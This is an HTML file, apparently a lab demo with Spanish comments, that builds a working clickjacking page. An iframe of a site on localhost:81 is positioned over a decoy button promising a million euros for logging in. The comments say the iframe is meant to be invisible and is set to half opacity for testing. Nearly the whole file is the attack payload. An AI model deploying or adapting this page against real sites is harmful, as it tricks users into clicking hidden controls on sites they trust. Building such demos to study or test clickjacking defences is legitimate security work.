<!doctype html>
 <html lang="es"></html>
  <head>
  <meta charset="UTF-8">
  <title>Demo Clickjacking</title>
  <link rel="stylesheet" href="http://localhost:81/css/estilo_principal.css">
  <style>
    /* contenedor que "prepara" la trampa */
      .contenedor {
        position: relative; 
            margin-top: 300px;
            margin-left: 200px;
            width: 462px; 
            height: 70px;
          /*overflow: hidden;*/
           
        }
        /*botón falso:*/
      #decoy {
        position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            font-size: 15px;
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px;
            z-index: 1; /*  DEBAJO del iframe */
        }
        /* iframe invisible (la víctima) */
        #iframe {
            position: absolute; 
            width: 1920px;
            height: 1080px;
            /* ajustar la web*/
            top: -490px;  
            left: -730px; 
      
            opacity: 0.5;   /* INVISIBLE      opacidad 0.5 xa pruebas  */
            z-index: 2;   /* ENCIMA del botón */
        }
    </style>
  </head>
  <body>  
       <div class="contenedor"> 
          <input type="button" id="decoy" value="INICIA SESIÓN para reclamar UN MILLÓN DE EUROS" >
          <iframe id="iframe" src="http://localhost:81"></iframe>
       </div> 
  </body>
</html>
